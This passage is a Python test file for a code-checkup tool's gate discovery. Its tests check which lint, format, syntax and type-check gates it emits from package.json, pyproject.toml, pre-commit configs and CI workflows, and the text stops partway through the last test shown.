"""Tests for ``pdd.checkup_gates`` deterministic gate discovery + execution.

The gate module exists so ``pdd checkup --pr --review-loop`` cannot ship a
clean LLM verdict on top of a worktree that fails a fast, deterministic
local check (e.g. ``prettier --check``). The tests below pin every gate
the v1 discovery set is supposed to emit, and pin the runner-side
contract (timeout handling, output truncation, secret scrubbing,
artifact persistence).
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path
from typing import Any, Dict, List
from unittest.mock import patch


def _make_pkg_json(scripts: Dict[str, str]) -> str:
    return json.dumps({"name": "fake", "version": "0.0.0", "scripts": scripts})


def _git_init(worktree: Path) -> None:
    """Initialize a minimal git repo so ``git diff --check`` has something to scan."""
    subprocess.run(["git", "init", "-q"], cwd=worktree, check=True)
    subprocess.run(
        [
            "git",
            "-c",
            "user.name=t",
            "-c",
            "user.email=t@x",
            "commit",
            "--allow-empty",
            "-m",
            "init",
            "-q",
        ],
        cwd=worktree,
        check=True,
    )


class TestDiscoverGates:
    """``discover_gates`` inspects repo config and emits an allowlisted gate set."""

    def test_emits_git_diff_check_always(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "git-diff-check" in names

    def test_finds_prettier_check_from_package_json(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:format:check" in names
        gate = next(g for g in gates if g.name == "npm:format:check")
        # iter-40 Finding 1: gate.cmd[0] is the absolute path to the
        # runner, not the bare name; verify by basename.
        assert Path(gate.cmd[0]).name in {"npm", "yarn", "pnpm", "bun"}
        assert "format:check" in gate.cmd

    def test_skips_non_check_scripts(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format": "prettier --write ."}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:format" not in names

    def test_skips_install_or_deploy_scripts(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {
                    "preinstall": "npm install foo",
                    "deploy": "firebase deploy",
                    "start": "node server.js",
                    "build": "tsc -p .",
                    "publish": "npm publish",
                    "push": "git push",
                }
            ),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        for forbidden in (
            "npm:preinstall",
            "npm:deploy",
            "npm:start",
            "npm:build",
            "npm:publish",
            "npm:push",
        ):
            assert forbidden not in names

    def test_skips_eslint_without_no_fix_flag(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"lint:check": "eslint --fix ."}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:lint:check" not in names

    def test_emits_py_compile_for_changed_python_files(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = [g.name for g in gates]
        assert "py-compile:a.py" in names
        gate = next(g for g in gates if g.name == "py-compile:a.py")
        # Iter-19 Finding 3: the gate MUST NOT write
        # ``__pycache__/*.pyc`` next to the source file. The argv
        # routes the syntax check through the builtin ``compile()``
        # so no bytecode is written to disk at all — neither
        # ``-B`` alone nor ``py_compile(..., cfile=os.devnull)`` are
        # sufficient (the former because py_compile writes
        # explicitly, the latter because py_compile uses an atomic
        # rename onto cfile which cannot target /dev/null).
        assert gate.cmd[:3] == [sys.executable, "-B", "-c"]
        assert "compile(" in gate.cmd[3]
        assert "py_compile" not in gate.cmd[3]
        assert gate.cmd[-1].endswith("a.py")

    def test_py_compile_required_fix_hint_does_not_recommend_bare_py_compile(
        self, tmp_path: Path
    ) -> None:
        """Iter-23 Finding 3: the required_fix hint a fixer LLM
        receives MUST NOT tell it to run bare ``python -m py_compile``.
        The gate avoids that exact form because it writes
        ``__pycache__`` next to the source — if the fixer follows the
        hint as instructions, the loop's downstream commit/push
        helper can stage the generated bytecode into the PR.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        py_gate = next(g for g in gates if g.name == "py-compile:a.py")
        hint = py_gate.required_fix_hint or ""
        assert "python -m py_compile" not in hint, (
            f"hint must not recommend bare py_compile: {hint!r}"
        )
        # The safe form (``-B`` + builtin ``compile()``) MUST be
        # what's recommended so the fixer reproduces a non-mutating
        # check.
        assert "compile(" in hint or "-B" in hint, (
            f"hint must recommend the safe compile() form: {hint!r}"
        )

    def test_tsc_required_fix_hint_does_not_recommend_bare_npx(
        self, tmp_path: Path
    ) -> None:
        """Iter-23 Finding 3: the tsc-noemit hint MUST point at
        ``npx --no-install``, not bare ``npx tsc``. A fixer following
        bare ``npx tsc`` can reach the npm registry."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {},
                    "devDependencies": {"typescript": "^5.0.0"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}", encoding="utf-8")
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        tsc_gates = [g for g in gates if g.name == "tsc-noemit"]
        if not tsc_gates:  # only when ``npx`` is on PATH
            return
        hint = tsc_gates[0].required_fix_hint or ""
        # ``npx --no-install tsc`` is fine; bare ``npx tsc`` is the
        # exact unsafe form we want to forbid. Search anchored on
        # whitespace so the safe form does not falsely trip the
        # check.
        assert "--no-install" in hint, f"hint must steer at --no-install: {hint!r}"
        # Explicit "do NOT use bare npx" guidance also recommended.
        assert (
            "bare" in hint.lower()
            or "do not use" in hint.lower()
            or "no-install" in hint.lower()
        )

    def test_py_compile_accepts_non_utf8_pep263_python_file(
        self, tmp_path: Path
    ) -> None:
        """Iter-20 Finding 2: valid Python files with a PEP 263 encoding
        declaration (``# -*- coding: latin-1 -*-`` etc.) must NOT trip
        the syntax gate. The pre-fix gate read the source with
        ``encoding='utf-8'`` and raised ``UnicodeDecodeError`` on the
        first non-UTF-8 byte, producing a false blocker. Passing bytes
        to ``compile()`` instead lets PEP 263 take effect.
        """
        from pdd.checkup_gates import discover_gates, run_gates

        _git_init(tmp_path)
        # A latin-1 source file: declare the encoding then include
        # bytes that are valid latin-1 but invalid UTF-8 (0xE9 = é).
        path = tmp_path / "latin.py"
        path.write_bytes(b"# -*- coding: latin-1 -*-\nGREETING = 'caf\xe9'\n")
        gates = [
            g
            for g in discover_gates(tmp_path, changed_files=("latin.py",))
            if g.name == "py-compile:latin.py"
        ]
        assert gates, "discovery should emit py-compile for latin.py"
        artifacts = tmp_path / "artifacts"
        results = run_gates(
            tmp_path,
            gates,
            artifacts_dir=artifacts,
            round_number=1,
            mode="review",
        )
        # ``compile()`` on the bytes payload respects PEP 263 and
        # exits 0 — the file is syntactically valid Python.
        assert results[0].exit_code == 0, (
            f"PEP 263 latin-1 source must pass; stderr={results[0].stderr_excerpt!r}"
        )

    def test_py_compile_does_not_write_pycache_to_worktree(
        self, tmp_path: Path
    ) -> None:
        """Iter-19 Finding 3 end-to-end: actually run the discovered
        gate against a valid .py file and confirm no ``__pycache__/``
        directory appears under the worktree afterwards. This guards
        against a future refactor that drops ``-B`` from the cmd
        without us noticing in unit tests that only inspect argv.
        """
        from pdd.checkup_gates import discover_gates, run_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = [
            g
            for g in discover_gates(tmp_path, changed_files=("a.py",))
            if g.name == "py-compile:a.py"
        ]
        assert gates, "discovery should emit py-compile for a.py"
        artifacts = tmp_path / "artifacts"
        results = run_gates(
            tmp_path,
            gates,
            artifacts_dir=artifacts,
            round_number=1,
            mode="review",
        )
        assert results[0].exit_code == 0
        assert not (tmp_path / "__pycache__").exists()
        assert not list(tmp_path.glob("**/__pycache__"))

    def test_skips_py_compile_when_no_python_files_changed(
        self, tmp_path: Path
    ) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gates = discover_gates(tmp_path, changed_files=("readme.md",))
        names = [g.name for g in gates]
        assert not any(n.startswith("py-compile:") for n in names)

    def test_skips_ruff_when_no_pyproject_config(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = [g.name for g in gates]
        assert "ruff" not in names

    def test_emits_ruff_when_configured_and_binary_present(
        self, tmp_path: Path
    ) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n", encoding="utf-8"
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = [g.name for g in gates]
        assert "ruff" in names

    def test_skips_ruff_when_configured_but_binary_missing(
        self, tmp_path: Path
    ) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n", encoding="utf-8"
        )
        with patch("pdd.checkup_gates.shutil.which", return_value=None):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = [g.name for g in gates]
        assert "ruff" not in names

    def test_emits_ruff_format_when_ruff_format_section_declared(
        self, tmp_path: Path
    ) -> None:
        """Issue #1433 Bug #2 + codex pass-5 finding 3: the
        ``ruff-format`` gate requires EXPLICIT opt-in via
        ``[tool.ruff.format]``. Bare ``[tool.ruff]`` is not enough —
        too many projects use ruff for linting while running black
        (which works on defaults without a ``[tool.black]`` section).
        Require the explicit section so the gate fires only on
        projects that demonstrably use ruff format.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n"
            '[tool.ruff.format]\nquote-style = "double"\n',
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        by_name = {g.name: g for g in gates}
        assert "ruff-format" in by_name, (
            f"missing ruff-format gate; saw {sorted(by_name)}"
        )
        cmd = by_name["ruff-format"].cmd
        assert cmd[0] == "/usr/bin/ruff"
        assert cmd[1] == "format"
        assert "--check" in cmd
        assert "--" in cmd
        dash_idx = cmd.index("--")
        path_idx = cmd.index("a.py")
        assert dash_idx < path_idx, f"ruff-format `--` must precede file path: {cmd}"

    def test_skips_ruff_format_when_only_ruff_lint_declared(
        self, tmp_path: Path
    ) -> None:
        """Codex pass-5 finding 3: bare ``[tool.ruff]`` without
        ``[tool.ruff.format]`` is ambiguous — many projects use ruff
        for linting + black (or default tooling) for formatting. Skip
        ruff-format unless the explicit opt-in section is present.
        Pre-fix code also fired on the "[tool.black] absent" signal,
        which produced false positives because black runs on defaults
        without a declared section.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n", encoding="utf-8"
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        # Lint gate fires (ruff is configured + binary present).
        assert "ruff" in names
        # Format gate skipped because [tool.ruff.format] absent.
        assert "ruff-format" not in names

    def test_skips_ruff_format_when_pyproject_touched_by_pr(
        self, tmp_path: Path
    ) -> None:
        """Iter-32 Findings 2 + 3 parity: ``python_tool_config_touched``
        gates ALL three Python tool gates. The new ``ruff-format`` gate
        must respect the same skip — a PR that edits ``pyproject.toml``
        could otherwise poison ``[tool.ruff.format]`` to make the
        format check pass over real divergence. Uses explicit
        ``[tool.ruff.format]`` opt-in so the test legitimately
        exercises the config-touched skip path (pass-5 finding 3
        requires the explicit section to trigger the gate).
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n"
            '[tool.ruff.format]\nquote-style = "double"\n',
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py", "pyproject.toml"))
        names = {g.name for g in gates}
        assert "ruff" not in names
        assert "ruff-format" not in names

    def test_skips_ruff_format_when_ruff_unconfigured(self, tmp_path: Path) -> None:
        """The ``ruff-format`` gate must share ``[tool.ruff]`` presence
        with the lint gate so a project that does not use ruff at all
        does not see spurious format failures from ruff's defaults.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.poetry]\nname = 'x'\n", encoding="utf-8"
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "ruff-format" not in names

    def test_skips_ruff_format_when_ruff_lint_plus_black_no_opt_in(
        self, tmp_path: Path
    ) -> None:
        """Codex review pass-4 finding 3 (refined by pass-5 finding 3):
        a project may declare ``[tool.ruff]`` for LINTING while
        running black for formatting. Firing ``ruff format --check``
        would block clean verdicts on formatting rules CI does not
        enforce. Under the pass-5 explicit-opt-in rule (require
        ``[tool.ruff.format]``) the format gate skips this
        configuration regardless of whether ``[tool.black]`` is
        declared — the absence of ``[tool.ruff.format]`` is the
        deciding signal.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n[tool.black]\nline-length = 100\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/tool"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        # Lint gate still fires (ruff configured + binary present).
        assert "ruff" in names
        # Format gate skipped because [tool.ruff.format] is absent.
        assert "ruff-format" not in names

    def test_emits_ruff_format_when_signaled_by_pre_commit_config(
        self, tmp_path: Path
    ) -> None:
        """Codex pass-6 finding 3: a project may run ``ruff format``
        via .pre-commit-config.yaml with Ruff's default formatter
        config and no `[tool.ruff.format]` section. The gate MUST
        detect that signal so the original CI-parity gap (Bug #2)
        does not re-emerge as a local clean + failing CI head.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n", encoding="utf-8"
        )
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n"
            "        args: ['--check']\n"
            "        # invokes: ruff format --check\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "ruff-format" in names
        # The gate's source reflects the CI-signal origin so operators
        # can audit which opt-in branch fired.
        by_name = {g.name: g for g in gates}
        assert by_name["ruff-format"].source == "ci-config:ruff format"

    def test_skips_ruff_format_when_pre_commit_hook_stage_manual(
        self, tmp_path: Path
    ) -> None:
        """Issue #1433 review (gltanaka): a ``.pre-commit-config.yaml``
        ``id: ruff-format`` hook gated to ``stages: [manual]`` never runs
        in the normal commit/CI flow, so it MUST NOT opt the gate in. The
        pre-fix signal treated any ``id: ruff-format`` text as opt-in and
        emitted a false blocking gate for ordinary changed Python files.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n", encoding="utf-8"
        )
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n"
            "        stages: [manual]\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "ruff-format" not in names

    def test_skips_ruff_format_when_default_stages_manual_inherited(
        self, tmp_path: Path
    ) -> None:
        """Issue #1433 review (gltanaka): a top-level
        ``default_stages: [manual]`` is inherited by an ``id: ruff-format``
        hook that declares no ``stages`` of its own — so the hook is
        manual-only and MUST NOT opt the gate in. The merged-stages value
        must be honoured, not dropped, when deciding the signal.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n", encoding="utf-8"
        )
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "default_stages: [manual]\n"
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "ruff-format" not in names

    def test_workflow_signal_opts_in_despite_manual_pre_commit_hook(
        self, tmp_path: Path
    ) -> None:
        """Issue #1433 review (gltanaka): workflow/CloudBuild signals stay
        independent of the pre-commit signal. A manual-only pre-commit
        ``id: ruff-format`` hook does not opt in, but a workflow that runs
        ``ruff format --check`` MUST still emit the gate.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n", encoding="utf-8"
        )
        # Manual-only pre-commit hook (would NOT signal on its own)...
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n"
            "        stages: [manual]\n",
            encoding="utf-8",
        )
        # ...but a real workflow invocation opts the gate in independently.
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text(
            "jobs:\n  lint:\n    steps:\n      - run: ruff format --check .\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "ruff-format" in names

    def test_emits_ruff_format_when_signaled_by_github_workflow(
        self, tmp_path: Path
    ) -> None:
        """Codex pass-6 finding 3: ``.github/workflows/*.yml`` is also
        a valid CI signal source.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n", encoding="utf-8"
        )
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text(
            "jobs:\n"
            "  lint:\n"
            "    steps:\n"
            "      - run: ruff check\n"
            "      - run: ruff format --check\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "ruff-format" in names

    def test_skips_ruff_format_when_ci_signal_is_only_in_comment(
        self, tmp_path: Path
    ) -> None:
        """Codex pass-8 finding 1: a YAML ``# TODO: enable ruff
        format`` comment must NOT trigger the gate. Comments and
        TODOs are stripped from each line before the regex scan.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[project]\nname = 'x'\n", encoding="utf-8"
        )
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text(
            "jobs:\n"
            "  lint:\n"
            "    steps:\n"
            "      # TODO: enable ruff format --check\n"
            "      - run: ruff check\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "ruff-format" not in names

    def test_ci_signal_unchanged_in_touched_file_still_counts(
        self, tmp_path: Path
    ) -> None:
        """Codex pass-8 finding 2: when the PR touches a CI config
        for an unrelated reason while the existing file already
        carries the ruff-format signal, the gate MUST honour the
        unchanged signal. Build a real two-commit worktree so
        ``git show <base>:.pre-commit-config.yaml`` resolves.
        """
        import subprocess

        from pdd.checkup_gates import discover_gates

        def run(*args: str) -> None:
            subprocess.run(
                ["git", *args], cwd=tmp_path, check=True, capture_output=True
            )

        _git_init(tmp_path)
        run("config", "user.email", "t@e.com")
        run("config", "user.name", "T")
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[project]\nname = 'x'\n", encoding="utf-8"
        )
        # BASE: file with the canonical ruff-format hook id.
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n",
            encoding="utf-8",
        )
        run("add", ".")
        run("commit", "-q", "-m", "base")
        # PR: touch the file for an unrelated hook (the ruff-format
        # signal line is unchanged).
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n"
            "      - id: ruff\n",
            encoding="utf-8",
        )
        run("add", ".")
        run("commit", "-q", "-m", "add ruff lint hook")
        import shutil as _shutil

        _real_which = _shutil.which

        def _which_ruff_only(name: str, **kw: object) -> object:
            if name == "ruff":
                return "/usr/bin/ruff"
            return _real_which(name, **kw)

        with patch("pdd.checkup_gates.shutil.which", side_effect=_which_ruff_only):
            gates = discover_gates(
                tmp_path,
                changed_files=("a.py", ".pre-commit-config.yaml"),
                base_ref="HEAD~1",
            )
        names = {g.name for g in gates}
        # Pre-fix code excluded the whole file when in diff → no
        # signal → skip. Pass-8 finding 2 fix: the unchanged
        # ``id: ruff-format`` line counts because it was present
        # at base AND at HEAD.
        assert "ruff-format" in names

    def test_skips_ruff_format_when_pr_added_signal_to_touched_file(
        self, tmp_path: Path
    ) -> None:
        """Codex pass-8 finding 2 defence: the same pre-vs-post
        comparison must STILL refuse to count a signal the PR
        introduced. Build a worktree where the base lacks the
        signal but the PR added it.
        """
        import subprocess

        from pdd.checkup_gates import discover_gates

        def run(*args: str) -> None:
            subprocess.run(
                ["git", *args], cwd=tmp_path, check=True, capture_output=True
            )

        _git_init(tmp_path)
        run("config", "user.email", "t@e.com")
        run("config", "user.name", "T")
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[project]\nname = 'x'\n", encoding="utf-8"
        )
        # BASE: file with NO ruff-format hook.
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos: []\n", encoding="utf-8"
        )
        run("add", ".")
        run("commit", "-q", "-m", "base")
        # PR: introduces the ruff-format hook.
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n",
            encoding="utf-8",
        )
        run("add", ".")
        run("commit", "-q", "-m", "add ruff-format hook")
        import shutil as _shutil

        _real_which = _shutil.which

        def _which_ruff_only(name: str, **kw: object) -> object:
            if name == "ruff":
                return "/usr/bin/ruff"
            return _real_which(name, **kw)

        with patch("pdd.checkup_gates.shutil.which", side_effect=_which_ruff_only):
            gates = discover_gates(
                tmp_path,
                changed_files=("a.py", ".pre-commit-config.yaml"),
                base_ref="HEAD~1",
            )
        names = {g.name for g in gates}
        # PR-introduced signal MUST not count — the base had no
        # id: ruff-format, so _file_has_unchanged_ruff_format_signal
        # returns False and the gate is suppressed.
        assert "ruff-format" not in names

    def test_ruff_format_respects_pre_commit_hook_files_scope(
        self, tmp_path: Path
    ) -> None:
        """Codex pass-8 finding 3: when the pre-commit ruff-format
        hook declares ``files: ^src/``, the gate must skip
        ``tests/...`` paths because the hook would not check them.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        # Files in src/ AND tests/.
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "code.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "tests").mkdir()
        (tmp_path / "tests" / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[project]\nname = 'x'\n", encoding="utf-8"
        )
        # Pre-commit hook scoped to src/ only.
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n"
            "        files: ^src/\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(
                tmp_path,
                changed_files=("src/code.py", "tests/a.py"),
            )
        by_name = {g.name: g for g in gates}
        assert "ruff-format" in by_name
        cmd = by_name["ruff-format"].cmd
        assert "src/code.py" in cmd
        assert "tests/a.py" not in cmd

    def test_ruff_format_skips_entirely_when_all_changed_py_out_of_scope(
        self, tmp_path: Path
    ) -> None:
        """Pass-8 finding 3 boundary: when the pre-commit hook scope
        excludes every changed_py file, the gate must be omitted
        (no argv with empty file list).
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "tests").mkdir()
        (tmp_path / "tests" / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[project]\nname = 'x'\n", encoding="utf-8"
        )
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n"
            "        files: ^src/\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("tests/a.py",))
        names = {g.name for g in gates}
        assert "ruff-format" not in names

    def test_pyproject_opt_in_ignores_pre_commit_scope(self, tmp_path: Path) -> None:
        """Codex pass-10 finding 1: ``[tool.ruff.format]`` opts in all
        Python files. A pre-commit hook with ``files: ^src/`` must NOT
        filter the gate's file list — that scope belongs to the pre-commit
        step, not to ``ruff format`` invoked directly. Pre-fix code applied
        the scope unconditionally, silently dropping files outside the hook
        scope even when pyproject.toml was the opt-in.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "code.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "tests").mkdir()
        (tmp_path / "tests" / "a.py").write_text("x = 1\n", encoding="utf-8")
        # pyproject opts in via [tool.ruff.format].
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff.format]\nquote-style = 'double'\n", encoding="utf-8"
        )
        # Pre-commit hook is scoped to src/ only — must NOT filter the gate.
        (tmp_path / ".pre-commit-config.yaml").write_text(
            "repos:\n"
            "  - repo: https://github.com/astral-sh/ruff-pre-commit\n"
            "    hooks:\n"
            "      - id: ruff-format\n"
            "        files: ^src/\n",
            encoding="utf-8",
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(
                tmp_path,
                changed_files=("src/code.py", "tests/a.py"),
            )
        by_name = {g.name: g for g in gates}
        assert "ruff-format" in by_name
        cmd = by_name["ruff-format"].cmd
        # Both files must appear — pyproject scope is "all Python files".
        assert "src/code.py" in cmd
        assert "tests/a.py" in cmd

    def test_skips_ruff_format_when_pr_narrowed_pre_commit_scope(
        self, tmp_path: Path
    ) -> None:
        """Codex pass-10 finding 2: a PR that changes ``files:``/``exclude:``
        so changed files are excluded must NOT silently remove the gate.
        The ``_file_has_unchanged_ruff_format_signal`` helper must also
        compare the scope and return False when it changed.
        """
        import subprocess

        from pdd.checkup_gates import discover_gates

        def run(*args: str) -> None:
            subprocess.run(
                ["git", *args], cwd=tmp_path, check=True, capture_output=True
            )

        _git_init(tmp_path)
